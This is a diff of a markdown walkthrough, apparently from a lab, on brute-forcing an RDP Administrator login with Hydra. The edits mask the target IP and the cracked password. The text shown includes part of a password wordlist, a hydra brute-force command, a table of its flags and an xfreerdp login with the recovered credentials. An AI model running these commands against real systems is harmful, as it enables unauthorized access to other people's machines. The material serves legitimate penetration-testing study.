@@ -57,7 +57,7 @@ jessica
 michael
 ashley
 qwerty
-Password.1!!
+Password.1**
 iloveu
 michelle
 tigger
@@ -79,7 +79,7 @@ sudo apt install hydra
 ## Hydra Command
 
 ```bash
-hydra -l Administrator -P ~/passwords.txt -t 4 -V rdp://10.0.2.6
+hydra -l Administrator -P ~/passwords.txt -t 4 -V rdp://10.0.*.*
 ```
 
 ---
@@ -94,7 +94,7 @@ hydra -l Administrator -P ~/passwords.txt -t 4 -V rdp://10.0.2.6
 | -t 4     | parallel connections |
 | -V       | verbose output       |
 | rdp://   | protocol             |
-| 10.0.2.6 | target IP            |
+| 10.0.*.* | target IP            |
 
 ---
 
@@ -122,6 +122,6 @@ Common issues:
 xfreerdp command example:
 
 ```bash
-xfreerdp /u:Administrator /p:Password.1!! /v:10.0.2.6
+xfreerdp /u:Administrator /p:Password.1** /v:10.0.*.*
 ```
 
